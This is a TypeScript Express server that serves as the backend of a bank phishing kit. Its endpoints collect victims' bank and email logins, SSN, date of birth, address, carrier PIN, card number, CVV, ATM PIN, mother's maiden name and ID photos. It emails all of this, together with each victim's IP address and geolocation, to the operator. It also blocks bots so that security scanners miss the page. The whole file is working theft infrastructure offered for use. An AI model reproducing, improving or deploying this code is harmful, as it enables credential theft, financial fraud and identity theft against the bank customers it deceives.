import express from "express";
import noBots from "express-nobots";
import geoip from "geoip-lite";
import MobileDetect from "mobile-detect";
import formidableMiddleware from "express-formidable";

require("dotenv").config();

import { sendEmail } from "./utils/sendEmail";
import path from "path";

const app = express();
app.use(formidableMiddleware());

const port = process.env.PORT || 5000;

app.use(noBots());
app.use(express.json());

app.post("/send-files", async (req, res) => {
  const md = new MobileDetect(req.headers["user-agent"] as string);
  const isBot = md.is("Bot");
  if (isBot) {
    res.send("Fuck off");
    return;
  }

  const front = req.files?.front as any;
  const back = req.files?.back as any;
  try {
    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const geo = geoip.lookup(ip as string | number);
    await sendEmail(
      process.env.TO as string,
      `
     <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
     <br>
     <h4>SUPPORTING DOCUMENTS</h4>
     <p>| (▰˘◡˘▰) See attached files</b></p>
     <br>
     <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
     <br>
     <p>| (▰˘◡˘▰) IP ☞ <b>${ip}</b></p>
     <p>| (▰˘◡˘▰) LOCATION ☞ <b>${geo?.city}, ${geo?.country}</b></p>
     <p>| (▰˘◡˘▰) TIMEZONE ☞ <b>${geo?.timezone}</b></p>
     <p>| (▰˘◡˘▰) USER AGENT ☞ <b>${req.headers["user-agent"]}</b></p>
     <br>
     <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄END⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
     `,
      `${process.env.BANK_NAME} - ${req.fields?.form} by ROCKET 🚀🚀🚀 From ${ip}`,
      [
        {
          filename: `Front.${front.name.split(".")[1]}`,
          content: front,
        },
        {
          filename: `Back.${front.name.split(".")[1]}`,
          content: back,
        },
      ]
    );
    res.send(Promise.resolve());
  } catch (error) {
    console.log(error);
    res.status(500).send("Something went wrong");
  }
});

app.post("/send-infos", async (req, res) => {
  const md = new MobileDetect(req.headers["user-agent"] as string);
  const isBot = md.is("Bot");
  if (isBot) {
    res.send("Fuck off");
    return;
  }

  try {
    const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
    const geo = geoip.lookup(ip as string | number);

    const values = JSON.parse(Object.keys(req.fields as any)[0]);

    await sendEmail(
      process.env.TO as string,
      `
     <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
     ${
       values.form === "LOGIN DETAILS"
         ? `
        <br>
        <h4>LOGIN DETAILS</h4>
        <p>| (▰˘◡˘▰) LOGIN ATTEMPT ☞ <b>${values.loginDetails.loginAttempt}</b></p>
        <p>| (▰˘◡˘▰) USERNAME ☞ <b>${values.loginDetails.username}</b></p>
        <p>| (▰˘◡˘▰) PASSWORD ☞ <b>${values.loginDetails.password}</b></p>
        <br>
        `
         : ` ${
             values.form === "EMAIL LOGINS"
               ? `
         <br>
         <h4>EMAIL LOGINS</h4>
         <p>| (▰˘◡˘▰) EMAIL ADDRESS ☞ <b>${values.emailLogins.email}</b></p>
         <p>| (▰˘◡˘▰) EMAIL ADDRESS PASSWORD ☞ <b>${values.emailLogins.emailPassword}</b></p>
         `
               : `
     ${
       values.form === "BILLING"
         ? `
     <br>
     <h4>BILLING</h4>
     <p>| (▰˘◡˘▰) FIRST NAME ☞ <b>${values.informations.firstname}</b></p>
     <p>| (▰˘◡˘▰) LAST NAME ☞ <b>${values.informations.lastname}</b></p>
     <p>| (▰˘◡˘▰) SSN ☞ <b>${values.informations.ssn}</b></p>
     <p>| (▰˘◡˘▰) DOB ☞ <b>${values.informations.dob}</b></p>
     <p>| (▰˘◡˘▰) STREET ADDRESS ☞ <b>${values.informations.streetAddress}</b></p>
     <p>| (▰˘◡˘▰) SUITE/APT/OTHER ☞ <b>${values.informations.suite}</b></p>
     <p>| (▰˘◡˘▰) ZIP CODE ☞ <b>${values.informations.zipCode}</b></p>
     <p>| (▰˘◡˘▰) STATE ☞ <b>${values.informations.state}</b></p>
     <p>| (▰˘◡˘▰) PHONE NUMBER ☞ <b>${values.informations.phoneNumber}</b></p>
     <p>| (▰˘◡˘▰) CARRIER PIN ☞ <b>${values.informations.carrierPin}</b></p>
     <br>
     `
         : ` <br>
         <h4>CARD DETAILS</h4>
         <p>| (▰˘◡˘▰) CARD NUMBER ☞ <b>${values.cardInformation.cardNumber}</b></p>
         <p>| (▰˘◡˘▰) EXPIRATION DATE ☞ <b>${values.cardInformation.expirationDate}</b></B></p>
         <p>| (▰˘◡˘▰) CVV ☞ <b>${values.cardInformation.securityCode}</b></p>
         <p>| (▰˘◡˘▰) MOTHER'S MAIDEN NAME ☞ <b>${values.cardInformation.mothersMaidenName}</b></p>
         <p>| (▰˘◡˘▰) CARD PIN ☞ <b>${values.cardInformation.atmPin}</b></p>
         <br>`
     }`
           }
     `
     }
     <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
     <br>
     <p>| (▰˘◡˘▰) IP ☞ <b>${ip}</b></p>
     <p>| (▰˘◡˘▰) LOCATION ☞ <b>${geo?.city}, ${geo?.country}</b></p>
     <p>| (▰˘◡˘▰) TIMEZONE ☞ <b>${geo?.timezone}</b></p>
     <p>| (▰˘◡˘▰) USER AGENT ☞ <b>${req.headers["user-agent"]}</b></p>
     <br>
     <div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄END⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
     `,
      `${process.env.BANK_NAME} - ${values.form} by ROCKET 🚀🚀🚀 From ${ip}`
    );
    res.send(Promise.resolve());
  } catch (error) {
    res.status(500).send("Something went wrong");
  }
});

app.use(express.static(path.join(__dirname, "../build")));
app.get("/-", (req, res) => {
  const md = new MobileDetect(req.headers["user-agent"] as string);
  const isBot = md.is("Bot");
  if (isBot) {
    res.send("Fuck off");
    return;
  }

  res.sendFile(path.join(__dirname, "../build", "index.html"));
});

app.listen(port, () => {
  console.log(`Listening on http://localhost:${port}`);
});
